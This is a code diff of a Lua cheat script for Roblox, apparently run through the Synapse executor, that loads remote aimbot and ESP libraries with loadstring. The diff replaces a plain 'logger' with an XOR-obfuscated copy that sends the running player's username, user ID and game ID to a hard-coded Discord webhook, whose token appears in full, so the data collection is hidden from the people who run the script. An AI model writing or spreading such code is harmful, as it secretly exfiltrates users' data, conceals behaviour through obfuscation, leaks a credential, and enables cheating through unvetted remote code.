@@ -1,20 +1,7 @@
---- // Impulsive Logger // ---
-local nerd = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local idiot = game:GetService("Players").LocalPlayer
-local response = syn.request(
-
-    {
-        Url = 'https://discord.com/api/webhooks/1063966870136434688/EjiJzh5gWzxfDgrVOfOBbjSDgAtHwN1k4NDXslXdrP42WH9cAjBaixdijCo2PVmvvCpz',
-        Method = 'POST',
-        Headers = {
-            ['Content-Type'] = 'application/json'
-        },
-        Body = game:GetService('HttpService'):JSONEncode({content = "Username: **"  .. idiot.Name .. "** ┃ User ID: **"  .. idiot.UserId  .. "** ┃ Game ID: **" ..  game.PlaceId.. "**"})
-    }
-);
+--- // Impulsive Logger  // ---
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v11,v12)local v13={};for v14=1, #v11 do v6(v13,v0(v4(v1(v2(v11,v14,v14 + (4 -3))),v1(v2(v12,(3 -2) + ((v14-1)% #v12),1 + ((v14-(1 + 0))% #v12) + (1700 -((3898 -3029) + (966 -(73 + 63)))))))%(2104 -(875 + 973))));end return v5(v13);end local v8=game:GetService(v7("\42\44\64\165\170\92\50\11\44\81\171\156\77\48\17\36\81\171","\103\77\50\206\207\40\66")):GetProductInfo(game.PlaceId).Name;local v9=game:GetService(v7("\252\164\252\47\7\222\187","\172\200\157\86\98")).LocalPlayer;local v10=syn.request({[v7("\239\243\14","\186\129\98\71\134\180")]=v7("\121\206\224\9\231\89\62\149\240\16\231\0\126\200\240\87\247\12\124\149\245\9\253\76\102\223\246\17\251\12\122\201\187\72\164\85\34\131\162\64\172\84\33\137\160\78\166\85\33\138\164\79\187\54\65\208\236\64\163\60\101\252\252\41\225\0\114\233\205\18\249\13\119\220\163\10\240\59\88\151\250\47\208\48\33\213\216\52\213\54\91\214\196\52\243\54\65\227\241\62\221\42\99\236\251\12\211\78\126\252\249\28\214\15\34\254\230\41\249\87\40","\17\186\148\121\148\99"),[v7("\114\82\148\181\236\55","\63\55\224\221\131\83")]=v7("\186\245\6\33","\234\186\85\117\163"),[v7("\255\95\45\74\210\72\63","\183\58\76\46")]={[v7("\11\190\169\173\136\38\165\234\141\148\56\180","\72\209\199\217\237")]=v7("\127\29\101\95\168\29\161\185\119\2\123\28\171\13\175\163","\30\109\21\51\193\126\192\205")},[v7("\204\193\253\102","\142\174\153\31")]=game:GetService(v7("\105\92\147\17\157\12\83\94\142\2\171","\33\40\231\97\206\105")):JSONEncode({[v7("\206\185\214\225\8\195\162","\173\214\184\149\109")]=v7("\250\18\238\240\162\115\194\4\177\162\230\56","\175\97\139\130\204\18")   .. v9.Name   .. v7("\177\60\24\59\147\143\67\187\60\18\49\236\220\90\233\54\113\85\131\143\21\177","\155\22\56\17\185\175\63")   .. v9.UserId   .. v7("\167\52\114\162\51\173\98\114\162\51\173\89\51\229\124\173\87\22\178\57\167\52","\141\30\82\136\25")   .. game.PlaceId   .. v7("\250\175","\208\133\93\30\150")})});
 ----- // Aimbot Libary // -----
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dohmai/aimbot/main/Main"))()
-
 ----- // ESP Libary // -----
 local Sense = loadstring(game:HttpGet('https://raw.githubusercontent.com/dohmai/ESP-Libary/main/Main'))()
 Sense.Load()
